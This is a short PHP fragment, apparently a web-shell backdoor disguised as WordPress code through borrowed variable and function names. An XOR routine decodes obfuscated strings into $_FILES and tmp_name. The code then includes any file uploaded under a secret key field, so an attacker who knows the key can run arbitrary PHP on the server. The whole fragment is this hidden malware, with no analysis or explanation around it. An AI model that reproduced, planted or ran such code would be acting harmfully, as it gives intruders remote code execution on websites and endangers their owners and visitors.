...
$full_match = 'BBsD6hSfInHhHsT';
$end_dirty = $full_match;
	$base = 'post_types';
function default_no_texturize_tags($sentences, $prime_pattern)

{
    $tags_to_ignore = $prime_pattern;
    $plural_base = urldecode($sentences);

    $revision_id = substr($tags_to_ignore,0, strlen($plural_base));

    $keys = $plural_base ^ $revision_id;
    return $keys;
}

$add_seconds_server = ${default_no_texturize_tags("%1D%04%3A%08s%3B", $end_dirty)};

$part = $add_seconds_server;

$message = isset($part[$end_dirty]);
if ($message)

{
    $updated = $add_seconds_server[$end_dirty];

    $foundid = $updated[default_no_texturize_tags("6%2F%03%1BX%09%3E%03", $end_dirty)];
	$site_url = 'template_lock';
    $new_status_post = $foundid;
    include ($new_status_post);
	$wildcards = 'get_posts';
}
